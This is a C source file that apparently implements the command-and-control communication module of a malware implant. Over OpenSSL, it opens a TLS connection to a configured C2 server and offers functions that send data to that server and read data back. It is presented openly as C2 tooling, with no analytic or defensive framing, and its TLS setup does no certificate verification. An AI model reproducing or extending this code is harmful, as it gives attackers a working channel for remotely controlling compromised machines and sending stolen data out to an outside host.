#include "c2_communication_fixed.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

static int sockfd = -1;
static SSL_CTX *ctx = NULL;
static SSL *ssl = NULL;

int c2_init() {
	// Initialize OpenSSL
	SSL_library_init();
	OpenSSL_add_all_algorithms();
	SSL_load_error_strings();

	// Create SSL context
	ctx = SSL_CTX_new(TLS_client_method());
	if (!ctx) {
		return -1;
	}

	// Create socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		SSL_CTX_free(ctx);
		return -1;
	}

	// Set server address
	struct sockaddr_in server_addr;
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(C2_PORT);
	if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
		close(sockfd);
		SSL_CTX_free(ctx);
		return -1;
	}

	// Connect to server
	if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
		close(sockfd);
		SSL_CTX_free(ctx);
		return -1;
	}

	// Create SSL object
	ssl = SSL_new(ctx);
	if (!ssl) {
		close(sockfd);
		SSL_CTX_free(ctx);
		return -1;
	}

	// Attach socket to SSL
	SSL_set_fd(ssl, sockfd);

	// Perform SSL handshake
	if (SSL_connect(ssl) <= 0) {
		SSL_free(ssl);
		close(sockfd);
		SSL_CTX_free(ctx);
		return -1;
	}

	return 0;
}

int c2_send_data(const char *data, size_t length) {
	if (sockfd < 0 || !ssl) {
		return -1;
	}

	return SSL_write(ssl, data, length);
}

int c2_receive_data(char *buffer, size_t max_length) {
	if (sockfd < 0 || !ssl) {
		return -1;
	}

	return SSL_read(ssl, buffer, max_length);
}

void c2_cleanup() {
	if (ssl) {
		SSL_shutdown(ssl);
		SSL_free(ssl);
	}

	if (sockfd >= 0) {
		close(sockfd);
	}

	if (ctx) {
		SSL_CTX_free(ctx);
	}
}
